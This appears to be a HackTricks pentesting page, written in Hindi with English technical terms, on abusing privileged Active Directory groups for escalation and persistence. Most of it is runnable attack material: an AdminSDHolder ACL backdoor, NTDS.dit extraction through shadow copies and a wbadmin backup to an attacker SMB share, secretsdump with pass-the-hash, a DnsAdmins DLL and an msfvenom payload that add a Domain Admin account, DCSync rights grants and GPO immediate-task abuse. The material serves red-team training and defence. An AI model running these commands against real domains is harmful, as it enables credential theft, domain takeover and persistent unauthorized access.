# विशेषाधिकार प्राप्त समूह

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकार वाले प्रसिद्ध समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

यह समूह ऐसे accounts और groups बनाने में सक्षम है जो domain पर administrators नहीं हैं। इसके अतिरिक्त, यह Domain Controller (DC) पर local login की अनुमति देता है।

इस समूह के सदस्यों की पहचान करने के लिए, निम्नलिखित command चलाई जाती है:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
नए users को जोड़ने की अनुमति है, साथ ही DC में local login की भी अनुमति है।<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group की Access Control List (ACL) महत्वपूर्ण है, क्योंकि यह Active Directory के सभी "protected groups" के लिए permissions निर्धारित करती है, जिनमें high-privilege groups भी शामिल हैं। यह mechanism unauthorized modifications को रोककर इन groups की security सुनिश्चित करता है।

एक attacker **AdminSDHolder** group की ACL को modify करके किसी standard user को full permissions दे सकता है। इससे उस user को सभी protected groups पर full control मिल जाएगा। यदि इस user की permissions बदली या हटा दी जाती हैं, तो system design के कारण वे एक घंटे के भीतर automatically फिर से बहाल हो जाएंगी।<sup>[[14]](#references)</sup>

हाल के Windows Server documentation में भी कई built-in operator groups को **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, आदि) माना गया है। **SDProp** process default रूप से हर 60 मिनट में **PDC Emulator** पर चलता है, `adminCount=1` सेट करता है और protected objects पर inheritance को disable करता है। यह persistence के साथ-साथ उन stale privileged users की hunting के लिए भी उपयोगी है, जिन्हें protected group से हटा दिया गया था, लेकिन वे अब भी non-inheriting ACL रखते हैं।<sup>[[12]](#references)</sup>

Members की समीक्षा और permissions को modify करने के commands में शामिल हैं:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
प्रक्रिया को जल्दी पुनर्स्थापित करने के लिए एक script उपलब्ध है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)।

अधिक जानकारी के लिए [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) पर जाएँ।<sup>[[14]](#references)</sup>

## AD Recycle Bin

इस group की सदस्यता हटाए गए Active Directory objects को पढ़ने की अनुमति देती है, जिससे sensitive information उजागर हो सकती है:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
यह **पिछले privilege paths को पुनर्प्राप्त करने** के लिए उपयोगी है। Deleted objects अभी भी `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, पुराने SPNs, या किसी deleted privileged group का DN उजागर कर सकते हैं, जिसे बाद में कोई अन्य operator restore कर सकता है।
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller तक Access

DC पर files का access restricted होता है, जब तक कि user `Server Operators` group का हिस्सा न हो; इससे access का level बदल जाता है।

### Privilege Escalation

Sysinternals से `PsService` या `sc` का उपयोग करके service permissions का निरीक्षण और संशोधन किया जा सकता है। उदाहरण के लिए, `Server Operators` group के पास कुछ services पर full control होता है, जिससे arbitrary commands का execution और privilege escalation संभव हो जाता है:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह command दर्शाता है कि `Server Operators` के पास पूर्ण access है, जिससे elevated privileges प्राप्त करने के लिए services में बदलाव किया जा सकता है।

## Backup Operators

`Backup Operators` group की membership `SeBackup` और `SeRestore` privileges के कारण `DC01` file system तक access प्रदान करती है। ये privileges `FILE_FLAG_BACKUP_SEMANTICS` flag का उपयोग करके, explicit permissions के बिना भी folder traversal, listing और file copying capabilities सक्षम करते हैं। इस प्रक्रिया के लिए specific scripts का उपयोग आवश्यक है।<sup>[[1]](#references)</sup>

Group members की सूची बनाने के लिए execute करें:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### स्थानीय Attack

इन privileges का local रूप से लाभ उठाने के लिए, निम्नलिखित steps अपनाए जाते हैं:

1. आवश्यक libraries import करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` सक्षम करें और सत्यापित करें:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. प्रतिबंधित डायरेक्टरी से फ़ाइलों को access और copy करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller के file system तक direct access से `NTDS.dit` database चुराया जा सकता है, जिसमें domain users और computers के सभी NTLM hashes होते हैं।

#### diskshadow.exe का उपयोग करना

1. `C` drive की shadow copy बनाएँ:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` को shadow copy से कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
वैकल्पिक रूप से, फ़ाइल कॉपी करने के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash retrieval के लिए `SYSTEM` और `SAM` extract करें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी hashes प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe का उपयोग

1. Attacker machine पर SMB server के लिए NTFS filesystem सेट अप करें और target machine पर SMB credentials cache करें।
2. System backup और `NTDS.dit` extraction के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** group के members अपने privileges का exploit करके DNS server पर SYSTEM privileges के साथ arbitrary DLL load कर सकते हैं। DNS server अक्सर Domain Controllers पर hosted होता है। यह capability significant exploitation potential प्रदान करती है।

DnsAdmins group के members की सूची बनाने के लिए, उपयोग करें:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### मनमानी DLL निष्पादित करना (CVE‑2021‑40469)

> [!NOTE]
> यह vulnerability DNS service (आमतौर पर DCs के अंदर) में SYSTEM privileges के साथ मनमाने code के execution की अनुमति देती है। यह issue 2021 में fix किया गया था।

Members निम्न जैसे commands का उपयोग करके DNS server से मनमानी DLL load करवा सकते हैं (या तो locally या remote share से):
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS service को restart करना (जिसके लिए अतिरिक्त permissions की आवश्यकता हो सकती है) DLL के load होने के लिए आवश्यक है:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
इस attack vector के बारे में अधिक जानकारी के लिए ired.team देखें।

#### Mimilib.dll

Command execution के लिए mimilib.dll का उपयोग करना भी संभव है। इसे specific commands या reverse shells execute करने के लिए modify किया जा सकता है। अधिक जानकारी के लिए [यह पोस्ट देखें](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)।<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins global query block list को disable करने के बाद WPAD record बनाकर Man-in-the-Middle (MitM) attacks करने के लिए DNS records को manipulate कर सकते हैं। Network traffic को spoof और capture करने के लिए Responder या Inveigh जैसे tools का उपयोग किया जा सकता है।

### Event Log Readers
Members event logs access कर सकते हैं और plaintext passwords या command execution details जैसी sensitive information प्राप्त कर सकते हैं:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

यह group domain object पर DACLs को modify कर सकता है, जिससे संभावित रूप से DCSync privileges प्रदान किए जा सकते हैं। इस group का फायदा उठाकर privilege escalation की techniques Exchange-AD-Privesc GitHub repo में विस्तार से दी गई हैं।
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
यदि आप इस समूह के सदस्य के रूप में कार्य कर सकते हैं, तो classic abuse किसी attacker-controlled principal को [DCSync](dcsync.md) के लिए आवश्यक replication rights प्रदान करना है:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
ऐतिहासिक रूप से, **PrivExchange** ने mailbox access, coerced Exchange authentication और LDAP relay को chain करके इसी primitive तक पहुंच बनाई। यहां तक कि जब वह relay path mitigated हो, तब भी `Exchange Windows Permissions` में direct membership या किसी Exchange server पर control domain replication rights तक पहुंचने का high-value route बना रहता है।

## Hyper-V Administrators

Hyper-V Administrators के पास Hyper-V का full access होता है, जिसका exploitation virtualized Domain Controllers पर control हासिल करने के लिए किया जा सकता है। इसमें live DCs को clone करना और `NTDS.dit` file से NTLM hashes extract करना शामिल है।

### Exploitation Example

Practical abuse आमतौर पर पुराने host-level LPE tricks के बजाय **DC disks/checkpoints तक offline access** होता है। Hyper-V host तक access होने पर, कोई operator virtualized Domain Controller का checkpoint या export बना सकता है, VHDX को mount कर सकता है और guest के अंदर LSASS को touch किए बिना `NTDS.dit`, `SYSTEM` और अन्य secrets extract कर सकता है:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
वहीं से, `Backup Operators` workflow का फिर से उपयोग करके `Windows\NTDS\ntds.dit` और registry hives को offline कॉपी करें। Related backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

यह group domain में members को Group Policies बनाने की अनुमति देता है। हालांकि, इसके members users या groups पर group policies लागू नहीं कर सकते और मौजूदा GPOs को edit नहीं कर सकते।

महत्वपूर्ण बात यह है कि **creator नए GPO का owner बन जाता है** और आमतौर पर बाद में उसे edit करने के लिए पर्याप्त rights प्राप्त कर लेता है। इसका अर्थ है कि यह group तब उपयोगी है जब आप इनमें से कोई कार्य कर सकते हों:

- एक malicious GPO बनाकर किसी admin को उसे target OU/domain से link करने के लिए राजी करना
- आपके द्वारा बनाए गए ऐसे GPO को edit करना जो पहले से किसी उपयोगी स्थान पर linked हो
- किसी अन्य delegated right का abuse करना, जो आपको GPOs link करने देता हो, जबकि यह group आपको edit करने की क्षमता देता है

Practical abuse का सामान्य अर्थ SYSVOL-backed policy files के माध्यम से **Immediate Task**, **startup script**, **local admin membership**, या **user rights assignment** में बदलाव करना होता है।<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
यदि `SYSVOL` के माध्यम से GPO को manually edit कर रहे हैं, तो याद रखें कि केवल यह बदलाव पर्याप्त नहीं है: `versionNumber`, `GPT.ini`, और कभी-कभी `gPCMachineExtensionNames` को भी update करना आवश्यक है, अन्यथा clients policy refresh को ignore कर देंगे।<sup>[[9]](#references)</sup>

## Organization Management

जिन environments में **Microsoft Exchange** deployed है, वहाँ **Organization Management** नामक एक special group के पास significant capabilities होती हैं। यह group **सभी domain users के mailboxes को access** करने के लिए privileged है और **'Microsoft Exchange Security Groups'** Organizational Unit (OU) पर **full control** बनाए रखता है। इस control में **`Exchange Windows Permissions`** group भी शामिल है, जिसका privilege escalation के लिए exploitation किया जा सकता है।

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** group के members को कई privileges प्राप्त होते हैं, जिनमें **`SeLoadDriverPrivilege`** भी शामिल है। यह उन्हें **Domain Controller पर locally log on** करने, उसे shut down करने और printers manage करने की अनुमति देता है। इन privileges का exploitation करने के लिए, विशेष रूप से तब जब unelevated context के अंतर्गत **`SeLoadDriverPrivilege`** दिखाई न दे, User Account Control (UAC) को bypass करना आवश्यक है।<sup>[[1]](#references)</sup>

इस group के members की सूची देखने के लिए निम्नलिखित PowerShell command का उपयोग किया जाता है:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Domain Controllers पर यह group खतरनाक है क्योंकि default Domain Controller Policy `Print Operators` को **`SeLoadDriverPrivilege`** प्रदान करती है। यदि आप इस group के किसी member के लिए elevated token प्राप्त कर लेते हैं, तो आप privilege को enable कर सकते हैं और kernel/SYSTEM तक पहुंचने के लिए signed-but-vulnerable driver load कर सकते हैं।<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Token handling की जानकारी के लिए [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) देखें।

#### Remote Desktop Users

इस group के members को Remote Desktop Protocol (RDP) के माध्यम से PCs तक access दिया जाता है। इन members की enumeration के लिए PowerShell commands उपलब्ध हैं:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP के exploitation से संबंधित अतिरिक्त जानकारी समर्पित pentesting resources में मिल सकती है।

#### Remote Management Users

Members **Windows Remote Management (WinRM)** के माध्यम से PCs को access कर सकते हैं। इन members की enumeration निम्नलिखित तरीके से की जाती है:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** से संबंधित exploitation techniques के लिए, विशिष्ट documentation देखी जानी चाहिए।

#### Server Operators

इस group के पास Domain Controllers पर विभिन्न configurations करने की permissions होती हैं, जिनमें backup और restore privileges, system time बदलना और system shutdown करना शामिल हैं।<sup>[[1]](#references)</sup> Members की enumeration करने के लिए command है:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Domain Controllers पर, `Server Operators` को आमतौर पर **services को reconfigure या start/stop करने** के लिए पर्याप्त rights मिलते हैं और default DC policy के माध्यम से `SeBackupPrivilege`/`SeRestorePrivilege` भी प्राप्त होते हैं। व्यवहार में, यह उन्हें **service-control abuse** और **NTDS extraction** के बीच एक bridge बना देता है:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
यदि किसी service ACL से इस group को change/start rights मिलते हैं, तो service को किसी arbitrary command पर point करें, उसे `LocalSystem` के रूप में start करें, और फिर मूल `binPath` restore करें। यदि service control locked down हो, तो `NTDS.dit` copy करने के लिए ऊपर दी गई `Backup Operators` techniques का उपयोग करें।

## References

- [1] [ired.team – Privileged Accounts और Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation के लिए SeLoadDriverPrivilege का दुरुपयोग](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions का दुरुपयोग](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, Part 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPOs और OUs के लिए Red Teamer की Guide](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Active Directory में Protected Accounts और Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Domain Admin Persistence प्राप्त करने के लिए AdminSDHolder का दुरुपयोग और Backdoor कैसे करें](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory में Escalation के लिए DnsAdmins Privilege का दुरुपयोग](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge abuse information](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
